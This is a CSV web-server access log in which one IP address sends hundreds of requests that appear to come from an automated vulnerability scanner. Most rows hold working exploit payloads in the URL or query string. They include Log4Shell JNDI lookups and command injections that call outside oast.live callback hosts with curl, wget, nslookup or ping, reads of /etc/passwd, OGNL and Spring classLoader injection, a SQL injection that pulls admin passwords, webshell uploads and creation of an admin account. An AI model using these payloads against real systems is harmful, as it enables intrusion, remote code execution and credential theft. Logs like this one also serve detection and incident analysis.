"uri","query_string","request_ip","method"
"/appGet.cgi","hook=get_cfg_clientlist()","148.135.107.254","GET"
"/redfish/v1/SessionService/Sessions/","-","148.135.107.254","POST"
"/webtools/control/SOAPService","-","148.135.107.254","POST"
"/pages/createpage-entervariables.action","SpaceKey=x","148.135.107.254","POST"
"/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/nacos/v1/cs/configs","dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/service/v1/service-details","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/admin/index.php","p=ajax-ops&op=elfinder&cmd=mkfile&name=2Y3PONzdTVtx35sYa7yKtEC98Vg.php&target=l1_Lw","148.135.107.254","GET"
"/RPC2_Login","-","148.135.107.254","POST"
"/wp-login.php","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==","-","148.135.107.254","GET"
"/api/get_device_details","-","148.135.107.254","GET"
"/openam/oauth2/..;/ccversion/Version","-","148.135.107.254","GET"
"/Config/SaveUploadedHotspotLogoFile","-","148.135.107.254","POST"
"/dashboardUser","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wsman","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wp-admin/","-","148.135.107.254","GET"
"/assets/elFinder-2.1.9/elfinder.html","-","148.135.107.254","GET"
"/./RestAPI/LogonCustomization","-","148.135.107.254","POST"
"/oam/server/opensso/sessionservice","-","148.135.107.254","GET"
"/login/","-","148.135.107.254","GET"
"/wiki/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/cobbler_api","-","148.135.107.254","POST"
"/v1/backend1","-","148.135.107.254","POST"
"/2Y3POf9qsNqJbKUF2odyqvLaOVG.php","cmd=sudo+rpm+--eval+%27%2525%7Blua%253aos.execute(%22curl+http%253a//cl82amo80ssu2h3kcjs0d6y9yut91gmjm.oast.live+-H+%27User-Agent%253a+tzpFmI%27%22)%7D%27","148.135.107.254","GET"
"/api/v1/login/oauth2/auth","-","148.135.107.254","POST"
"/sitecore/shell/ClientBin/Reporting/Report.ashx","-","148.135.107.254","POST"
"/backend/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/cgi-bin/slogin/login.py","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/RestAPI/ImportTechnicians","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/elFinder/php/connector.minimal.php","cmd=mkfile&target=l1_Lw&name=2Y3POSWtZRpWdeFtTvg91rekxzn.php:aaa","148.135.107.254","GET"
"/cgi","7","148.135.107.254","POST"
"/client/index.php","-","148.135.107.254","GET"
"/lab.html","vpath=//interact.sh","148.135.107.254","GET"
"/","x=$%7Bjndi:ldap://$%7B:-639%7D$%7B:-510%7D.$%7BhostName%7D.uri.cl82amo80ssu2h3kcjs0rpa9cz6kdh7fh.oast.live/a%7D","148.135.107.254","GET"
"/v1/2Y3PNuxJ4SgJAl2GDajVgTbyq1r.php","-","148.135.107.254","GET"
"/goforms/menu","-","148.135.107.254","GET"
"/wan.htm","-","148.135.107.254","GET"
"/pages/createpage.action","spaceKey=myproj","148.135.107.254","POST"
"/uploads/assets/backend/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/apisix/admin/migrate/export","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","DELETE"
"/api/ping/;%2560id%2560","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","GET"
"/formLoginAuth.htm","authCode=1&userName=admin&goURL&action=login","148.135.107.254","GET"
"/cgi-bin/export-cgi","category=config&arg0=startup-config.conf","148.135.107.254","GET"
"/login.htm","-","148.135.107.254","GET"
"/cgi-bin/admin.cgi","Command=sysCommand&Cmd=ping$%7BIFS%7D-c$%7BIFS%7D1$%7BIFS%7Dcl82amo80ssu2h3kcjs0tdat7jnwz3ua3.oast.live","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/uploads/assets/backend/elfinder/elfinder.html","-","148.135.107.254","GET"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","PUT"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=memberhero_send_form&_memberhero_hook=phpinfo","148.135.107.254","GET"
"/mgmt/tm/util/bash","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/OA_CGI/FNDWRR.exe","-","148.135.107.254","GET"
"/template/custom/content-editor","-","148.135.107.254","POST"
"/userportal/Controller","mode=8700&operation=1&datagrid=179&json=%7B%22%25f0%259f%25a6%259e%22:%22test%22%7D","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/templates/editor-preload-container","-","148.135.107.254","POST"
"/OA_HTML/BneViewerXMLService","bne:uueupload=TRUE","148.135.107.254","POST"
"/functionRouter","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/pages/templates2/viewpagetemplate.action","-","148.135.107.254","POST"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","GET"
"/catalog-portal/ui/oauth/verify","error&deviceUdid=%2524%257b%2522%2566%2572%2565%2565%256d%2561%2572%256b%2565%2572%252e%2574%2565%256d%2570%256c%2561%2574%2565%252e%2575%2574%2569%256c%2569%2574%2579%252e%2545%2578%2565%2563%2575%2574%2565%2522%253f%256e%2565%2577%2528%2529%2528%2522%2563%2561%2574%2520%252f%2565%2574%2563%252f%2568%256f%2573%2574%2573%2522%2529%257d","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=wpt_admin_update_notice_option","148.135.107.254","POST"
"/uploads/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/wp-json/am-member/license","-","148.135.107.254","POST"
"/wp-content/uploads/html2wp/2Y3PO4mzsNOmrNCQ34TBP5vEepO.php","-","148.135.107.254","GET"
"/wp-admin/admin.php","page=html2wp-settings","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=easync_success_and_save","148.135.107.254","GET"
"/apisix/batch-requests","-","148.135.107.254","POST"
"/","class.module.classLoader.resources.context.configFile=http://cl82amo80ssu2h3kcjs0ynnpr3gm6az9o.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx","148.135.107.254","GET"
"/actuator/gateway/routes/2Y3POOl0VNZ2Nz6IvWFEsMH7QLF","-","148.135.107.254","POST"
"/aj.html","a=devi","148.135.107.254","GET"
"/actuator/gateway/refresh","-","148.135.107.254","POST"
"/wp-admin/admin-post.php","vrc_cmd=phpinfo","148.135.107.254","GET"
"/vcac/","-","148.135.107.254","GET"
"/OA_HTML/BneViewerXMLService","bne:uueupload=TRUE","148.135.107.254","POST"
"/Admin/Access/Setup/Default.aspx","Action=createadministrator&adminusername=ZgKHQQ&adminpassword=yCD2sr&adminemail=test@test.com&adminname=test","148.135.107.254","GET"
"/zabbix/index_sso.php","-","148.135.107.254","GET"
"/plugin","-","148.135.107.254","GET"
"/geoserver/wms","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","location=search","148.135.107.254","GET"
"/sap/admin/public/default.html","-","148.135.107.254","GET"
"/login","redirect=%252F","148.135.107.254","GET"
"/vcac/","original_uri=https://clicktrans.pl%252Fvcac","148.135.107.254","GET"
"/users/user-dark-features","-","148.135.107.254","POST"
"/index_sso.php","-","148.135.107.254","GET"
"/admin/uploads.php","id=1","148.135.107.254","POST"
"/%2524%257B%2528%2523a%253D%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2522whoami%2522%2529.getInputStream%2528%2529%252C%2522utf-8%2522%2529%2529.%2528%2540com.opensymphony.webwork.ServletActionContext%2540getResponse%2528%2529.setHeader%2528%2522X-Cmd-Response%2522%252C%2523a%2529%2529%257D/","-","148.135.107.254","GET"
"/logfile","d=crossdomain.xml","148.135.107.254","GET"
"/cgi-bin-hax/ExportSettings.sh","-","148.135.107.254","GET"
"/dologin.action","-","148.135.107.254","POST"
"/OASREST/v2/authenticate","-","148.135.107.254","POST"
"/page","id=2Y3PNqO9UNeaWvf2pa4B2jibRcS&settings%5Bview%2520options%5D%5BoutputFunctionName%5D=x;process.mainModule.require(%2527child_process%2527).execSync(%2527wget+http://cl82amo80ssu2h3kcjs0wo9z7fda3eajz.oast.live%2527);s","148.135.107.254","GET"
"/app/options.py","-","148.135.107.254","POST"
"/backupsettings.dat","-","148.135.107.254","GET"
"/vendor/htmlawed/htmlawed/htmLawedTest.php","-","148.135.107.254","POST"
"/ajax/openvpn/del_ovpncfg.php","-","148.135.107.254","POST"
"/controller/ping.php","-","148.135.107.254","POST"
"/api/v2/cmdb/system/admin","-","148.135.107.254","GET"
"/","class.module.classLoader.resources.context.configFile=https://cl82amo80ssu2h3kcjs0ig7sft79g919j.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx","148.135.107.254","GET"
"/service/extension/backup/mboximport","account-name=admin&account-status=1&ow=cmd","148.135.107.254","POST"
"/pfblockerng/www/index.php","-","148.135.107.254","GET"
"/api/2Y3PNkzie2PWIcv4cJbQpjfvNgO","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/conf_mail.php","-","148.135.107.254","POST"
"/card_scan.php","No=123&ReaderNo=%60sleep%25207%60&CardFormatNo=123","148.135.107.254","GET"
"/actuator/gateway/routes/2Y3POOl0VNZ2Nz6IvWFEsMH7QLF","-","148.135.107.254","DELETE"
"/api/content/","-","148.135.107.254","POST"
"/api/agent/tabs/agentData","-","148.135.107.254","POST"
"/fileupload/toolsAny","-","148.135.107.254","POST"
"/xmlrpc","-","148.135.107.254","POST"
"/%2524%257B%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2522nslookup%2520cl82amo80ssu2h3kcjs0t8xkug3fnpsdm.oast.live%2522%2529%257D/","-","148.135.107.254","GET"
"/ztp/cgi-bin/handler","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"//interactsh.com%252f..","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=loginas_return_admin","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/login/index.php","login=$(ping$%7BIFS%7D-nc$%7BIFS%7D2$%7BIFS%7D%60whoami%60.cl82amo80ssu2h3kcjs06ct5rezh3hrdh.oast.live)","148.135.107.254","POST"
"/wp-admin/users.php","-","148.135.107.254","GET"
"/js/jquery_file_upload/server/php/","-","148.135.107.254","POST"
"/csrf","-","148.135.107.254","GET"
"/SamlResponseServlet","-","148.135.107.254","POST"
"/service/extension/backup/mboximport","account-name=admin&ow=2&no-switch=1&append=1","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL","148.135.107.254","GET"
"/api/scrape/kube-system","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/webapi/auth","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=cfom_upload_file&name=2Y3POaxVANE9PArrDbYKvGu9sCT.pHp","148.135.107.254","POST"
"/cgi-bin/popen.cgi","command=cat%2520/etc/passwd&v=0.1303033443137912","148.135.107.254","GET"
"/api/v2/cmdb/system/admin/admin","-","148.135.107.254","PUT"
"/wp-content/uploads/cfom_files/2y3poaxvane9parrdbykvgu9sct.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/admin/login/index.php","-","148.135.107.254","GET"
"/accounts/login/","-","148.135.107.254","GET"
"/setup/setupadministrator-start.action","-","148.135.107.254","GET"
"/downloader.php","file=%253Becho+CVE-2023-23333%7Crev%2500.zip","148.135.107.254","GET"
"/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php","-","148.135.107.254","POST"
"/kubepi/api/v1/users","-","148.135.107.254","POST"
"/forms/doLogin","login_username=admin&password=password$(curl%2520cl82amo80ssu2h3kcjs0ednmqq4m3mt91.oast.live)&x=0&y=0","148.135.107.254","GET"
"/session/login","-","148.135.107.254","GET"
"/wp-json/wp/v2/add-listing","id=1","148.135.107.254","GET"
"/%252577eb%252575i_%252577sma_Http","-","148.135.107.254","POST"
"/api/v1/clusters/kubeconfig/k8s","-","148.135.107.254","GET"
"/","url=%3Cimg/src=%22http://cl82amo80ssu2h3kcjs0kpgt334tteaqn.oast.live%22%3E","148.135.107.254","GET"
"/spip.php","page=spip_pass","148.135.107.254","GET"
"/api/v1/database/1","-","148.135.107.254","GET"
"/cgi-bin/popen.cgi","command=type%2520C://Windows/win.ini&v=0.1303033443137912","148.135.107.254","GET"
"/json/setup-restore.action","-","148.135.107.254","POST"
"/ajax/api/user/save","-","148.135.107.254","POST"
"///CFIDE/adminapi/accessmanager.cfc","method=foo&_cfclient=true","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/setup/setupadministrator-start.action","-","148.135.107.254","GET"
"/aspera/faspex/package_relay/relay_package","-","148.135.107.254","POST"
"/app","-","148.135.107.254","POST"
"/server-info.action","bootstrapStatusProvider.applicationConfig.setupComplete=0&cache2Y3PO99iDP7QWGb81IFc3NidGbj","148.135.107.254","GET"
"/flash/addcrypted2","-","148.135.107.254","POST"
"/saas./resttosaasservlet","-","148.135.107.254","POST"
"/setup/setupadministrator.action","-","148.135.107.254","POST"
"/flash/addcrypted2","-","148.135.107.254","GET"
"/index.php","c=blocked&action=continue","148.135.107.254","POST"
"/wp-login.php","-","148.135.107.254","GET"
"/app","service=page/SetupCompleted","148.135.107.254","GET"
"/api/hassio/app/.%25252e/supervisor/info","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/api/hassio/app/.%2509./supervisor/info","-","148.135.107.254","GET"
"/_api/web/siteusers","-","148.135.107.254","GET"
"/cgi-bin/cstecgi.cgi","-","148.135.107.254","POST"
"/Servlet/Skins","-","148.135.107.254","POST"
"/wp-admin/profile.php","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","POST"
"/ws/msw/tenant/%2527%2520union%2520select%2520%2528select%2520ID%2520from%2520SGMSDB.DOMAINS%2520limit%25201%2529%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2528select%2520concat%2528id%252C%2520%2527%253A%2527%252C%2520password%2529%2520from%2520sgmsdb.users%2520where%2520active%2520%253D%2520%25271%2527%2520order%2520by%2520issuperadmin%2520desc%2520limit%25201%2520offset%25200%2529%252C%2527%2527%252C%2520%2527%2527%252C%2520%2527","-","148.135.107.254","GET"
"/dologin.action","-","148.135.107.254","POST"
"/api/hassio_ingress/.%2509./supervisor/info","-","148.135.107.254","GET"
"/api/v1/database/1","-","148.135.107.254","GET"
"/api/runscript","-","148.135.107.254","POST"
"/2Y3PNbdaWnJe0J6A2doUpggVTRK","-","148.135.107.254","GET"
"/wp-content/plugins/ultimate-member/readme.txt","-","148.135.107.254","GET"
"/main/webservices/additional_webservices.php","-","148.135.107.254","POST"
"/mifs/asfV3/api/v2/admins/users","-","148.135.107.254","GET"
"/_api/web/siteusers","-","148.135.107.254","GET"
"/appliance/login","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/attachment/404/abbba.php","-","148.135.107.254","POST"
"/getsamplebacklog","arg1=2d0ows2x9anpzaorxi9h4csmai08jjor&arg2=%257b%2522type%2522%253a%2522client%2522%252c%2522earliest%2522%253a%25221676976316.328%257c%257cnslookup%2520%2524(xxd%2520-pu%2520%253c%253c%253c%2520%2524(whoami)).cl82amo80ssu2h3kcjs0a9zingato5oqi.oast.live%257c%257cx%2522%252c%2522latest%2522%253a1676976916.328%252c%2522origins%2522%253a%255b%257b%2522ip%2522%253a%2522clicktrans.pl%2522%252c%2522source%2522%253a0%257d%255d%252c%2522seriesID%2522%253a3%257d&arg3=undefined&arg4=undefined&arg5=undefined&arg6=undefined&arg7=undefined","148.135.107.254","GET"
"/v1/folder","path=%252F","148.135.107.254","GET"
"/api/session/properties","-","148.135.107.254","GET"
"/api/v1/database/2","-","148.135.107.254","GET"
"/app/rest/users/id:1/tokens/RPC2","-","148.135.107.254","DELETE"
"/app","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/","PHPRC=/dev/fd/0","148.135.107.254","POST"
"/pig/add-pig.php","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/file-manager/backend/makefile","-","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/welcome.action","-","148.135.107.254","GET"
"/","rest_route=/wp/v2/users","148.135.107.254","GET"
"/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index","-","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/_images/YhOPVW","-","148.135.107.254","GET"
"/mifs/aad/api/v2/admins/users","-","148.135.107.254","GET"
"/api/users","-","148.135.107.254","POST"
"/file-manager/backend/text","-","148.135.107.254","POST"
"/app/rest/users/id:1/tokens/RPC2","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/login/userverify.cgi","-","148.135.107.254","POST"
"/mgmt/tm/auth/user/O3FEi","-","148.135.107.254","PATCH"
"/api/v1/database/2","-","148.135.107.254","GET"
"/api/server/version","-","148.135.107.254","GET"
"/mics/services/MICSLogService","-","148.135.107.254","POST"
"/emap/devicePoint_addImgIco","hasSubsystem=true","148.135.107.254","POST"
"/wp-json/wp/v2/users/","-","148.135.107.254","GET"
"/api/setup/validate","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/app","service=page/PrinterList","148.135.107.254","GET"
"/login.php","-","148.135.107.254","GET"
"/file-manager/","-","148.135.107.254","GET"
"/v1/folder","path=%252F","148.135.107.254","GET"
"/nagiosxi/login.php","-","148.135.107.254","GET"
"/feed/","-","148.135.107.254","GET"
"/author-sitemap.xml","-","148.135.107.254","GET"
"/cgi-bin/vitogate.cgi","-","148.135.107.254","POST"
"/file-manager/backend/permissions","-","148.135.107.254","POST"
"/dview8/api/usersByLevel","-","148.135.107.254","GET"
"/2AvesbzTal.php","-","148.135.107.254","GET"
"/forms/doLogin","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/concrete5/index.php/install","-","148.135.107.254","GET"
"/jquery-file-upload/server/php/","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/admin%2520/db","-","148.135.107.254","GET"
"/ws/v1/cluster/apps/new-application","-","148.135.107.254","POST"
"/mgmt/tm/util/bash","-","148.135.107.254","POST"
"/clusterList","-","148.135.107.254","GET"
"/zp-core/setup/index.php","-","148.135.107.254","GET"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/groovyconsole","-","148.135.107.254","GET"
"/cgi-bin/ExportSettings.sh","-","148.135.107.254","GET"
"/setup/install.php","-","148.135.107.254","GET"
"/etc/groovyconsole.html","-","148.135.107.254","GET"
"/install","-","148.135.107.254","GET"
"/wp-admin/install.php","step=1","148.135.107.254","GET"
"/index.php/install","-","148.135.107.254","GET"
"/upload/setup/install.php","-","148.135.107.254","GET"
"/.tugboat","-","148.135.107.254","GET"
"/html/setup.html","-","148.135.107.254","GET"
"/admin/install.php","-","148.135.107.254","GET"
"/mgmt/tm/auth/user/O3FEi","-","148.135.107.254","PATCH"
"/nacos/v1/auth/users","pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g","148.135.107.254","GET"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/api/v1/pods","-","148.135.107.254","GET"
"/v1/auth/users","pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g","148.135.107.254","GET"
"/lab/api/settings/","-","148.135.107.254","GET"
"/images/json","-","148.135.107.254","GET"
"/zp/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/gallery/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/ipython/tree","-","148.135.107.254","GET"
"/web/database/manager","-","148.135.107.254","GET"
"/nacos/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/zenphoto/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/pods","-","148.135.107.254","GET"
"/IdKnVi","-","148.135.107.254","GET"
"/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/solr/gettingstarted_shard1_replica_n1/config","-","148.135.107.254","POST"
"/solr/admin/collections","action=%2524%257Bjndi%253Aldap%253A%252F%252F%2524%257B%253A-470%257D%2524%257B%253A-488%7D%257D.%2524%257BhostName%257D.uri.cl82amo80ssu2h3kcjs0reinnryghe3cn.oast.live%252F%257D","148.135.107.254","GET"
"/webui/logoutconfirm.html","logon_hash=1","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/dashboard/proc.php","type=login","148.135.107.254","POST"
"/http/index.php","-","148.135.107.254","POST"
"/c42api/v3/LoginConfiguration","username=$%7Bjndi:ldap://$%7B:-610%7D$%7B:-879%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0sn8t1amtrria4.oast.live/test%7D&url=https://localhost","148.135.107.254","GET"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/runners/start","-","148.135.107.254","POST"
"/ccmadmin/j_security_check","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/solr/admin/cores","action=%2524%257Bjndi%253Aldap%253A%252F%252F%2524%257B%253A-470%257D%2524%257B%253A-488%7D%257D.%2524%257BhostName%257D.uri.cl82amo80ssu2h3kcjs091p6wyenzmx74.oast.live%252F%257D","148.135.107.254","GET"
"/suite-auth/login","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/plus/flink.php","dopost=save&c=cat%2520/etc/passwd","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/users/sign_in","-","148.135.107.254","GET"
"/WebReport/ReportServer","op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/T0oCLE7p.jsp","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/api/v1/repos/search","limit=1","148.135.107.254","GET"
"/j_security_check","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/druid/coordinator/v1/lookups/config/$%257bjndi:ldap:%252f%252fcl82amo80ssu2h3kcjs0k5hrho1fuh51p.oast.live%252ftea%257d","-","148.135.107.254","DELETE"
"/showfile.php","file=/etc/passwd","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/api/system/sessions","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/fsms/fsmsh.dll","FSMSCommand=$%7Bjndi:ldap://$%7B:-657%7D$%7B:-251%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0hr6gz7qkfab94.oast.live/r7vrv%7D","148.135.107.254","GET"
"/ocpu/library/base/R/do.call/json","-","148.135.107.254","POST"
"/jenkins/script","-","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/_search","a=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-505%257D$%257B%253A-347%257D.$%257BhostName%257D.search.cl82amo80ssu2h3kcjs03j4y9jwdouonm.oast.live%257D","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/script/","-","148.135.107.254","GET"
"/data/manage/cmd.php","cmd=id","148.135.107.254","GET"
"/mifs/j_spring_security_check","-","148.135.107.254","POST"
"/Upload/test/2Y3POARRKli4z9YhyN3XjNw40b3.php","-","148.135.107.254","GET"
"/api/system/deviceinfo","-","148.135.107.254","GET"
"/webmail/basic/","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/geojson","url=$%7Bjndi:ldap://$%7B:-300%7D$%7B:-638%7D.$%7BhostName%7D.url.cl82amo80ssu2h3kcjs0ak1ymxtghaegg.oast.live%7D","148.135.107.254","GET"
"/v1/agent/service/register","-","148.135.107.254","PUT"
"/db_dump.php","-","148.135.107.254","GET"
"/v2/query","-","148.135.107.254","POST"
"/Upload/upload_file.php","l=test","148.135.107.254","POST"
"/flexnet/logon.do","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/plugin/customMethod","-","148.135.107.254","POST"
"/goanywhere/auth/Login.xhtml","-","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/nacos/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/login/SAML","=$%7Bjndi:ldap://$%7B:-813%7D$%7B:-985%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0mjajuipahy5i1.oast.live/ni8wp%7D","148.135.107.254","GET"
"/Login","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/logstash/pipeline/$%257Bjndi:ldap://$%257B:-992%257D$%257B:-240%257D.$%257BhostName%257D.username.cl82amo80ssu2h3kcjs0yrrjxhthcggmo.oast.live/NOTsC%257D","-","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/fpc/login/","-","148.135.107.254","POST"
"/http-bind","room=$%7Bjndi:ldap://$%7B:-156%7D$%7B:-734%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0f8jimdu8zewtr.oast.live/bCu6W%7D","148.135.107.254","GET"
"/sysShell","-","148.135.107.254","POST"
"/manager/radius/server_ping.php","ip=127.0.0.1%7Ccat%2520/etc/passwd%3E../../2Y3PO9kdbwooMYGliBpawFeQF9q.txt&id=1","148.135.107.254","GET"
"/2Y3PO9kdbwooMYGliBpawFeQF9q.txt","-","148.135.107.254","GET"
"/two_fact_auth","-","148.135.107.254","POST"
"/debug.php","-","148.135.107.254","POST"
"/AdminPage/conf/runCmd","cmd=id","148.135.107.254","GET"
"/lcms/index.php","-","148.135.107.254","POST"
"/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc","-","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/app","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=system&host=ipconfig","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/upgrade_handle.php","cmd=writeuploaddir&uploaddir=%2527;whoami;%2527","148.135.107.254","GET"
"/opennms/j_spring_security_check","-","148.135.107.254","POST"
"/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/prweb/","-","148.135.107.254","GET"
"/upload/UploadResourcePic.ashx","ResourceID=8382","148.135.107.254","POST"
"/j_security_check","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(id)","148.135.107.254","GET"
"/directdata/direct/router","-","148.135.107.254","POST"
"/seeyon/main.do","method=login","148.135.107.254","POST"
"/api/sonicos/auth","-","148.135.107.254","POST"
"/v1/submissions","-","148.135.107.254","GET"
"/api/login","-","148.135.107.254","POST"
"/index.php","s=weibo/Share/shareBox&query=app=Common%2526model=Schedule%2526method=runSchedule%2526id%5Bstatus%5D=1%2526id%5Bmethod%5D=Schedule-%253E_validationFieldItem%2526id%5B4%5D=function%2526%5B6%5D%5B%5D=%2526id%5B0%5D=cmd%2526id%5B1%5D=assert%2526id%5Bargs%5D=cmd=system(ver)","148.135.107.254","GET"
"/data/pbootcms.db","-","148.135.107.254","GET"
"/en-US/account/login","-","148.135.107.254","POST"
"/2Y3POZN3TVwpcJDqmEkPTFoOt7W.txt","-","148.135.107.254","GET"
"/php/ping.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/ddi/server/upload/lmo32u.php","-","148.135.107.254","GET"
"/login/userverify.cgi","-","148.135.107.254","POST"
"/cgi-bin/Maintain/date_config","-","148.135.107.254","POST"
"/api/ping","count=5&host=;cat%2520/etc/passwd;&port=80&source=1.1.1.1&type=icmp","148.135.107.254","GET"
